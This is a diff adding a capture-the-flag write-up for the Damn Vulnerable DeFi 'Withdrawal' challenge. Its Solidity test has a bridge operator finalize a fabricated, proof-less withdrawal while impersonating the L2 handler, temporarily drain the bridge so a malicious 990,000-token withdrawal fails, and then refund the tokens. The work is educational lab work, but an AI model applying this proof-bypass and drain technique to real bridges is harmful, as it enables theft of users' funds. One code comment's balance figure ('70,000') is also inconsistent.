@@ -20,6 +20,8 @@ In the explanations below, I assume that you are familiar with contracts.
 [14. Puppet V3](#14-puppet-v3)  
 [15. ABI Smuggling](#15-abi-smuggling)  
 [16. Shards](#16-shards)    
+[17. Curvy Puppet](#17-curvy-puppet)    
+[18. Withdrawal](#18-withdrawal)    
 
 ## 1. Unstoppable
 
@@ -1562,4 +1564,124 @@ Attack flow:
     function test_shards() public checkSolvedByPlayer {
         Attacker attacker = new Attacker(address(token), address(marketplace), recovery);
         attacker.attack();
+    }
+
+
+## 18. Withdrawal
+
+### Challenge Overview
+
+There's a token bridge to withdraw Damn Valuable Tokens from an L2 to L1. It has a million DVT tokens in balance.   
+The L1 side of the bridge allows anyone to finalize withdrawals, as long as the delay period has passed and they present a valid Merkle proof. The proof must correspond with the latest withdrawals' root set by the bridge owner. 
+You were given the event logs of 4 withdrawals initiated on L2 in a JSON file. They could be executed on L1 after the 7 days delay. 
+But there's one suspicious among them, isn't there? You may want to double-check, because all funds might be at risk. Luckily you are a bridge operator with special powers.    
+Protect the bridge by finalizing _all_ given withdrawals, preventing the suspicious one from executing, and somehow not draining all funds. 
+
+### Vulnerability Analysis  
+
+The challenge exposes a critical threat where a potentially malicious user attempts to withdraw 990,000 tokens (99% of the bridge's balance) alongside legitimate transactions. The discovery comes from analyzing the withdrawal events where:
+
+    // Third withdrawal (discovered to be malicious)
+    {
+        "topics": [...],
+        "data": "0xbaee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015..."
+    }
+
+When decoded, this withdrawal reveals:
+    - Receiver: 0xea475d60c118d7058bef4bdd9c32ba51139a74e0
+    - Amount: 0xd38be6051f27c26000 (990,000 tokens)
+    - Unlike other withdrawals that request only 10 tokens each
+
+Solution flow:    
+
+1. Create a fabricated withdrawal message that transfers 990,000 tokens from the bridge to the player's address 
+2. Use operator privilege to finalize this fake withdrawal without providing a Merkle proof, temporarily draining the bridge    
+3. Move forward in time past the delay period for the legitimate withdrawals (7+ days)  
+4. Process the first two legitimate 10-token withdrawals successfully   
+5. Process the malicious third withdrawal (990,000 tokens), which fails during execution due to insufficient funds  
+6. Process the fourth legitimate 10-token withdrawal successfully   
+7. Return the 990,000 tokens to the bridge to satisfy the challenge requirements that most tokens remain in the bridge  
+8. All withdrawals are now marked as finalized, including the malicious one which failed execution but was still marked as processed    
+
+### Solution
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_withdrawal() public checkSolvedByPlayer {
+
+        // Create a fabricated withdrawal that transfers 990,000 tokens to the player
+        bytes memory message = abi.encodeCall(
+            L1Forwarder.forwardMessage,
+            (
+                0, // nonce
+                address(0), // l2Sender (empty address works here)  
+                address(l1TokenBridge), // target
+                abi.encodeCall( // encode the actual executeTokenWithdrawal call
+                    TokenBridge.executeTokenWithdrawal,
+                    (
+                        player, // recipient of the withdrawal
+                        990_000e18 // amount to withdraw - leaving 100k in bridge
+                    )
+                )
+            )
+        );
+
+        // Use operator privilege to finalize the fake withdrawal without providing Merkle proof
+        l1Gateway.finalizeWithdrawal(
+            0, // nonce
+            l2Handler, // impersonate l2Handler to pass authorization checks in TokenBridge 
+            address(l1Forwarder), // target to process the forwarded message
+            block.timestamp - 7 days, // old timestamp to pass the 7-day delay requirement
+            message, 
+            new bytes32[](0) // empty proof array since we're using operator privilege  
+        );
+
+        // Move time forward past the delay period for the legitimate withdrawals
+        vm.warp(1718786915 + 8 days);
+        
+        // Finalize the first legitimate withdrawal (10 tokens)
+        l1Gateway.finalizeWithdrawal(
+            0, // nonce
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
+            1718786915, // timestamp
+            hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbAd8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // encoded message data
+            new bytes32[](0) // no proof needed as operator
+        );
+
+        // Finalize the second legitimate withdrawal (10 tokens)
+        l1Gateway.finalizeWithdrawal(
+            1, // nonce
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
+            1718786965, // timestamp
+            hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbAd8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // encoded message data
+            new bytes32[](0) // no proof needed as operator
+        );
+
+        // Finalize the malicious third withdrawal (990,000 tokens)
+        // This will fail during execution due to insufficient funds (only 70,000 left after two 10-token withdrawals)
+        // But it will still be marked as finalized in the gateway
+        l1Gateway.finalizeWithdrawal(
+            2, // nonce
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
+            1718787050, // timestamp
+            hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2C4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000", // encoded message data
+            new bytes32[](0) // no proof needed as operator
+        );
+
+        // Finalize the fourth legitimate withdrawal (10 tokens)
+        l1Gateway.finalizeWithdrawal(
+            3, // nonce
+            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
+            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
+            1718787127, // timestamp
+            hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2C4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // encoded message data
+            new bytes32[](0) // no proof needed as operator
+        );
+ 
+        // Return the borrowed tokens to the bridge
+        token.transfer(address(l1TokenBridge),990_000e18);
     }
